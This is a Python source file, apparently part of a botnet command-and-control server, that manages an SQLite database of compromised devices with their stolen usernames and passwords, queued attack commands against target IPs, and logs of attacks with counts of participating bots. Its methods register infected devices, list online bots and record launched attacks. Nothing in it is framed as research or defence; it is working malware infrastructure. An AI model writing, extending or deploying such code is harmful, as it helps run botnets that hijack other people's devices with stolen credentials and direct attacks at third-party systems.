# C2 server database manager
import sqlite3
import logging
import threading
import os
from datetime import datetime

class DatabaseManager:
    def __init__(self, db_path='c2_database.db'):
        # If db_path is not absolute, make it absolute relative to this file
        if not os.path.isabs(db_path):
            db_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), db_path)
        self.db_path = db_path
        self.db_lock = threading.Lock()
        self.init_database()
    
    def init_database(self):
        """Initialize database tables"""
        conn = self.get_connection()
        cursor = conn.cursor()
        
        # Table for compromised devices
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS devices (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT UNIQUE,
                username TEXT,
                password TEXT,
                status TEXT DEFAULT 'offline',
                last_seen TIMESTAMP,
                infection_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Table for commands
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                command TEXT,
                target_ip TEXT,
                attack_type TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                status TEXT DEFAULT 'pending',
                bot_ip TEXT
            )
        ''')
        
        # Table for attack logs
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS attack_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT,
                port INTEGER,
                service TEXT,
                credentials TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                attack_type TEXT,
                target TEXT,
                start_time TIMESTAMP,
                participating_bots INTEGER,                status TEXT
            )
        ''')
        conn.commit()
        conn.close()
        logging.info("Database initialized successfully")
    
    def get_connection(self):
        """Get database connection with error handling"""
        try:
            conn = sqlite3.connect(self.db_path)
            # Enable foreign keys support
            conn.execute("PRAGMA foreign_keys = ON")
            # Return dictionary-like objects instead of tuples
            conn.row_factory = sqlite3.Row
            return conn
        except sqlite3.Error as e:
            logging.error(f"Database connection error: {e}")
            raise
    
    def register_device(self, ip, username, password):
        """Register a compromised device"""
        with self.db_lock:
            conn = self.get_connection()
            cursor = conn.cursor()
            try:
                cursor.execute('''
                    INSERT OR REPLACE INTO devices (ip, username, password, status, last_seen)
                    VALUES (?, ?, ?, 'online', CURRENT_TIMESTAMP)
                ''', (ip, username, password))
                conn.commit()
                logging.info(f"Database: Registered device {ip} with '{username}':'{password}'")
                return True
            except Exception as e:
                logging.error(f"Database error registering device {ip}: {e}")
                return False
            finally:
                conn.close()
    
    def update_device_status(self, ip, status):
        """Update device status"""
        with self.db_lock:
            conn = self.get_connection()
            cursor = conn.cursor()
            cursor.execute('''
                UPDATE devices SET status = ?, last_seen = CURRENT_TIMESTAMP WHERE ip = ?
            ''', (status, ip))
            conn.commit()
            conn.close()
    
    def get_all_devices(self):
        """Get all devices from database"""
        conn = self.get_connection()
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM devices')
        devices = cursor.fetchall()
        conn.close()
        
        # Convert tuples to dictionaries
        columns = ['id', 'ip', 'username', 'password', 'status', 'last_seen', 'infection_time']
        return [dict(zip(columns, device)) for device in devices]
    
    def get_online_devices(self):
        """Get only online devices"""
        conn = self.get_connection()
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM devices WHERE status = "online"')
        devices = cursor.fetchall()
        conn.close()
        
        # Convert tuples to dictionaries
        columns = ['id', 'ip', 'username', 'password', 'status', 'last_seen', 'infection_time']
        return [dict(zip(columns, device)) for device in devices]
    
    def log_attack(self, attack_type, target, participating_bots):
        """Log attack information"""
        with self.db_lock:
            conn = self.get_connection()
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO attack_logs (attack_type, target, participating_bots, start_time, status)
                VALUES (?, ?, ?, CURRENT_TIMESTAMP, 'active')
            ''', (attack_type, target, participating_bots))
            conn.commit()
            conn.close()
    
    def get_latest_scan_results(self, limit=10):
        """Get latest scan results"""
        conn = self.get_connection()
        cursor = conn.cursor()
        cursor.execute('''
            SELECT ip, port, service, MAX(timestamp) as timestamp
            FROM attack_logs
            WHERE port IS NOT NULL
            GROUP BY ip
            ORDER BY timestamp DESC
            LIMIT ?
        ''', (limit,))
        results = [{'ip': row[0], 'port': row[1], 'service': row[2], 'timestamp': row[3]} 
                  for row in cursor.fetchall()]
        conn.close()
        return results
        
    def get_device(self, ip):
        """Get device by IP address"""
        conn = self.get_connection()
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM devices WHERE ip = ?', (ip,))
        device = cursor.fetchone()
        conn.close()
        
        if not device:
            return None
            
        # Convert tuple to dictionary
        columns = ['id', 'ip', 'username', 'password', 'status', 'last_seen', 'infection_time']
        return {columns[i]: device[i] for i in range(len(columns))}
